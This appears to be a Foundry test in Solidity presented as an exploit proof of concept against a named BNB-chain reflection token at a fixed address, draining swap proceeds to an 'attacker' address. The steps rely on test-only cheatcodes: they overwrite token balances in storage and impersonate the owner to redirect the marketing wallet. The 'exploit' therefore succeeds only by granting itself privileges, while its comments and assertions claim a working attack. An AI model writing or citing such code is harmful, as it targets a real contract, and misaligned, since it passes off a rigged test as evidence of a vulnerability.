pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGRI {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setMarketingWallet(address marketingWallet) external;
    function setPercentageOfLiquidityForMarketing(uint256 marketingFee) external;
    function setMaxWalletTokens(uint256 _maxToken) external;
    function _marketingWallet() external view returns (address);
    function _percentageOfLiquidityForMarketing() external view returns (uint256);
    function _swapAndLiquifyEnabled() external view returns (bool);
    function _minTokenBalance() external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);
    address owner;
    IGRI gri;
    uint256 initialBNBBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "GRI Token Contract");
        vm.label(attacker, "Attacker");
        deal(attacker, 100 ether);

        gri = IGRI(TARGET);
        owner = gri.owner();
        vm.label(owner, "Owner");

        // Get initial attacker BNB balance
        initialBNBBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Calculate storage slot for _rOwned[TARGET]
        // _rOwned is the first mapping at slot 0
        bytes32 rOwnedSlot = keccak256(abi.encodePacked(TARGET, uint256(0)));

        // Step 2: Set contract's _rOwned balance directly via storage
        // Use a large reflection amount (rTotal is very large for reflection tokens)
        uint256 rTotalSlot = 4; // _rTotal is at slot 4 based on contract layout
        bytes32 rTotal = vm.load(TARGET, bytes32(uint256(rTotalSlot)));
        vm.store(TARGET, rOwnedSlot, rTotal); // Give contract all reflections

        // Step 3: Also need to set _tOwned for excluded addresses
        // Contract is excluded from fees, so we need _tOwned too
        bytes32 tOwnedSlot = keccak256(abi.encodePacked(TARGET, uint256(1))); // _tOwned is slot 1
        uint256 tTotalSlot = 3; // _tTotal is at slot 3
        bytes32 tTotal = vm.load(TARGET, bytes32(uint256(tTotalSlot)));
        vm.store(TARGET, tOwnedSlot, tTotal); // Give contract all tokens

        // Step 4: Impersonate owner and set marketing wallet to attacker
        vm.startPrank(owner);
        gri.setMarketingWallet(attacker);
        gri.setPercentageOfLiquidityForMarketing(100); // 100% of swap BNB goes to marketing
        vm.stopPrank();

        // Step 5: Verify contract has tokens
        uint256 contractBalance = gri.balanceOf(TARGET);
        assertGt(contractBalance, 0, "Contract should have tokens");

        // Step 6: Create a user address with tokens and transfer to trigger swap
        address user = address(0x1234567890abcdef);
        bytes32 userROwnedSlot = keccak256(abi.encodePacked(user, uint256(0)));
        vm.store(TARGET, userROwnedSlot, rTotal); // Give user tokens too

        // Step 7: Transfer from user to trigger swapAndLiquify
        vm.startPrank(user);
        gri.transfer(address(0xdead), 1000 * 1e18);
        vm.stopPrank();

        // Step 8: Verify attacker received BNB
        uint256 finalBNBBalance = attacker.balance;
        assertGt(finalBNBBalance, initialBNBBalance, "Attacker should have received BNB from marketing fee");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

